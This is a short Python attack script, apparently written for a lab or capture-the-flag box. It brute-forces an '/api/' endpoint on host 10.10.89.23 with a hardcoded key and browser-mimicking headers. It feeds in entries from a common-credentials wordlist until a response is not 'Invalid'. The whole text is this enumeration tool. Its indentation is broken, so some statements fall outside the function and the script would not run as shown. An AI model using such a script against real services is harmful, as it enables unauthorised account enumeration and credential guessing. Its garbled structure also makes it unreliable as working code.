#! /bin/python3
import requests
import json
def userenum(u):
 url = "http://10.10.89.23:8081"
 key = "7454c262d0d5a3a0c0b678d6c0dbc7ef"
 req = url+"/api/"+u
 referer = url+"/forgot?"
s = requests.Session()
headers = {
 "Accept" : "*/*",
 "Accept-Encoding": "gzip,deflate",
 "Accept-Language": "en-US,en;q=0.5",
 "Cache-Control": "no-cache",
 "Connection": "keep-alive",
 "Content-Length": "42",
 "Content-type":"application/json",
 "Host":"10.10.89.23:8081",
 "Origin": url,
 "Pragma": "no-cache",
 "Referer": referer,
 "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
 }
jsonPayload = {"key": key}
 requ = requests.Request('POST', req, headers=headers, data=json.dumps(jsonPayload))
 prepared = requ.prepare()
 r = s.send(prepared)
 response = r.text.split(" ")
 print(response)
 if(response[0] != "Invalid"):
 print("[+] Match found : "+u)
 return 0
 return 1
file="/usr/share/SecLists/Passwords/Common-Credentials/10k-most-common.txt"
file1="./list"
with open(file,'r') as f:
 list=f.read().splitlines()
i=0
while True:
 print("[+] Try : "+list[i])
 v=userenum(list[i])
 if(v==0):
 print("[+] over")
 break
 i+=1
